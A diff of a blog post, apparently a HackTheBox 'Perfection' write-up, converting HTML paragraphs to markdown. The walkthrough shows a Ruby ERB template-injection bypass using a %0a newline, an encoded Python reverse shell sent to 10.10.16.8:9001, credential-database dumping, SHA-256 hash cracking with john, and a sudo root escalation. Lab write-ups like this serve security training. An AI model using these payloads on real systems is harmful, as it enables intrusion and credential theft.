@@ -13,7 +13,7 @@ series: Machines
 
 ## First Steps
 
-<p>We will first run an Nmap scan to discover all open ports:</p>
+We will first run an Nmap scan to discover all open ports:
 
 ```bash
 sudo nmap -p- -T4 --open -Pn 10.10.11.253
@@ -29,7 +29,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.85 seconds
 
 ```
 
-<p>Then, we can run Nmap with flags to get the services and their versions:</p>
+Then, we can run Nmap with flags to get the services and their versions:
 
 ```bash
 sudo nmap -sC -sV -p22,80 10.10.11.253 --open -Pn
@@ -51,13 +51,13 @@ Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
 
 ```
 
-<p>We see that there's a website called "Weighted Grade Calculator". Once we access the website, we get to the following functionality:</p>
+We see that there's a website called "Weighted Grade Calculator". Once we access the website, we get to the following functionality:
 
 <div class="center"><img src="/assets/images/screenshots/htb-perfection-website1.png"></div>
 
 ## User Flag
 
-<p>We can fill out the fields seen above and send the request. With Burp Suite, we can intercept it to see what is going on. Then, we can alter one of the parameters to test for SSTI vulnerabilities:</p>
+We can fill out the fields seen above and send the request. With Burp Suite, we can intercept it to see what is going on. Then, we can alter one of the parameters to test for SSTI vulnerabilities:
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -76,11 +76,13 @@ Upgrade-Insecure-Requests: 1
 category1={{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>In the response, however, we see that the application is returning "Malicious input blocked".</p>
+In the response, however, we see that the application is returning "Malicious input blocked".
 
 ```html
 [...snip]
-       <p>Please enter a maximum of five category names, your grade in them out of 100, and their weight. Enter "N/A" into the category field and 0 into the grade and weight fields if you are not using a row.</p>
+       
+
+Please enter a maximum of five category names, your grade in them out of 100, and their weight. Enter "N/A" into the category field and 0 into the grade and weight fields if you are not using a row.
       </form>
       Malicious input blocked
     </div>
@@ -88,7 +90,7 @@ category1={{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&
 [...snip]
 ```
 
-<p>However, we can bypass the checks by adding a URL-encoded new line character (<custom-code>%0a</custom-code>).</p>
+However, we can bypass the checks by adding a URL-encoded new line character (`%0a`).
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -107,23 +109,26 @@ Upgrade-Insecure-Requests: 1
 category1=aa%0a{{7*7}}&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>We see that the response no longer returns "Malicious input blocked".</p>
+We see that the response no longer returns "Malicious input blocked".
 
 ```html
 [...snip] Your total grade is 80%
-<p>aa {{7*7}}: 16%</p>
+
+aa {{7*7}}: 16%
 [...snip]
 ```
 
-<p>We saw a reference to Sinatra in the error page, which means that the application is likely developed in Ruby. We can then try the following SSTI payload for Ruby's ERB: <custom-code><%= 7*7 %> </custom-code></p>
+We saw a reference to Sinatra in the error page, which means that the application is likely developed in Ruby. We can then try the following SSTI payload for Ruby's ERB: `<%= 7*7 %> `
 
 ```html
      </form>
-      Your total grade is 80%<p>aa
-49 : 16%</p>
+      Your total grade is 80%
+
+aa
+49 : 16%
 ```
 
-<p>And, as seen above, it worked. We can now geenrate a reverse shell payload with GoPariah and send it in the request</p>´
+And, as seen above, it worked. We can now geenrate a reverse shell payload with GoPariah and send it in the request´
 
 ```bash
 POST /weighted-grade-calc HTTP/1.1
@@ -142,18 +147,18 @@ Upgrade-Insecure-Requests: 1
 category1=aa%0a<%25%3d+system("curl+10.10.16.8:9001?p=$(echo+-n+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjgiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc%3d+|+base64+-d+|+bash)")+%25>&grade1=80&weight1=20&category2=Category2&grade2=80&weight2=20&category3=Category3&grade3=80&weight3=20&category4=Category4&grade4=80&weight4=20&category5=Category5&grade5=80&weight5=20
 ```
 
-<p>We will open a listener before sending it and we will get a connection back as "susan"</p>
+We will open a listener before sending it and we will get a connection back as "susan"
 
 ```bash
 nc -l 9001
 susan@perfection:~/ruby_app$
 ```
 
-<p>We're in! Once we are inside the machine, we can read the user flag</p>
+We're in! Once we are inside the machine, we can read the user flag
 
 ## Root Flag
 
-<p>Inside the machine, we can see that there's an email to susan:</p>
+Inside the machine, we can see that there's an email to susan:
 
 ```bash
 susan@perfection:~$ cat /var/spool/mail/susan
@@ -171,7 +176,7 @@ Please hit me with updates on the migration when you can. I am currently registe
 - Tina, your delightful student
 ```
 
-<p>Brute-forcing the password would probably be impossible. However, in the home directory we find a folder called "Migration" that contains a database</p>
+Brute-forcing the password would probably be impossible. However, in the home directory we find a folder called "Migration" that contains a database
 
 ```bash
 susan@perfection:~/Migration$ ls
@@ -182,7 +187,7 @@ file pupilpath_credentials.db
 pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
 ```
 
-<p>We can use sqlite3 to open it</p>
+We can use sqlite3 to open it
 
 ```bash
 susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db
@@ -201,7 +206,7 @@ select * from users;
 5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
 ```
 
-<p>we can then use john with a mask to achieve</p>
+we can then use john with a mask to achieve
 
 ```bash
 Tools/john/run/john --format=raw-sha256 --mask=susan_nasus_\?d\?d\?d\?d\?d\?d\?d\?d\?d hashcrackmeplz
@@ -214,7 +219,7 @@ Use the "--show --format=Raw-SHA256" options to display all of the cracked passw
 Session completed.
 ```
 
-<p>Now that we know her password, we can</p>
+Now that we know her password, we can
 
 ```bash
 susan@perfection:~/Migration$ sudo -l
@@ -233,6 +238,6 @@ sudo su
 root@perfection:/home/susan/Migration#
 ```
 
-<p>We can now read the root flag.</p>
+We can now read the root flag.
 
-<p>That's all, folks!</p>
+That's all, folks!
